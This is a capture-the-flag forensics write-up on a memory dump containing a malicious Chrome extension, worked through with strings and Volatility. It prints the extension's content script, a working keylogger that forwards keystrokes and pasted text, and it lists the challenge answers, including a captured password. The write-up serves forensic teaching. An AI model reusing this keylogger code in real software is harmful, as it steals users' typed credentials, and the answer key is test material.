# Stealth Invasion

Selene's normally secure laptop recently fell victim to a covert attack. Unbeknownst to her, a malicious Chrome extension was stealthily installed, masquerading as a useful productivity tool. Alarmed by unusual network activity, Selene is now racing against time to trace the intrusion, remove the malicious software, and bolster her digital defenses before more damage is done.

-----
### (1) What is the PID of the Original (First) Google Chrome process:

Ran `strings` against the memory dump and `grep 'Chrome'`, trying each of the PIDs

```
4080
```

### (2) What is the only Folder on the Desktop

Ran `strings` against the memory dump and `grep 'Desktop'`:

```
malext
```

### (3) What is the Extension's ID (ex: `hlkenndednhfkekhgcdicdfddnkalmdm`)

Ran `strings` against the memory dump and `grep '\\Google\\Chrome` and `grep Extension`, trying each ID:

```
nnjofihdjilebhiiemfmdlpbdkbjcpae
```

### (4) After examining the malicious extension's code, what is the log filename in which the data is stored

Ran `vol windows.filescan.FileScan` for `malext` to find memory addresses:

```
0xa708c8d9ec30  \Users\selene\Desktop\malext\background.js
0xa708c8d9fef0  \Users\selene\Desktop\malext\manifest.json
0xa708c8da14d0  \Users\selene\Desktop\malext\rules.json
0xa708c8da1e30  \Users\selene\Desktop\malext\content-script.js
0xa708ca379980  \Users\selene\Desktop\malext\_metadata\generated_indexed_rulesets\_ruleset1
```

Ran `vol windows.dumpfiles` to get these files. Found `content-script.js` logs keystrokes to file:

```javascript
var conn = chrome.runtime.connect({ name: "conn" });

chrome.runtime.sendMessage('update');

(async () => {
    const response = await chrome.runtime.sendMessage({ check: "replace_html" });
    console.log(response)
})();

chrome.runtime.sendMessage('replace_html', (response) => {
    conn.postMessage({ "type": "check", "data": "replace_html" });
});

document.addEventListener("keydown", (event) => {
    const key = event.key;
    conn.postMessage({ "type": "key", "data": key });
    return true;
});

document.addEventListener("paste", (event) => {
    let paste = event.clipboardData.getData("text/plain");
    conn.postMessage({ "type": "paste", "data": paste });
    return true;
});
```

Searching output file `filescan` for `nnjofihdjilebhiiemfmdlpbdkbjcpae`, found the log file was `000003.log`.

```
000003.log
```

### (5) What is the URL the user navigated to

Extracted `000003.log`, found the user visited `drive.google.com`

```
drive.google.com
```

### (6) What is the password of `selene@rangers.eldoria.com`

After entering `selene@rangers.eldoria.com`, the password entered is `clip-mummify-proofs`

```
clip-mummify-proofs
```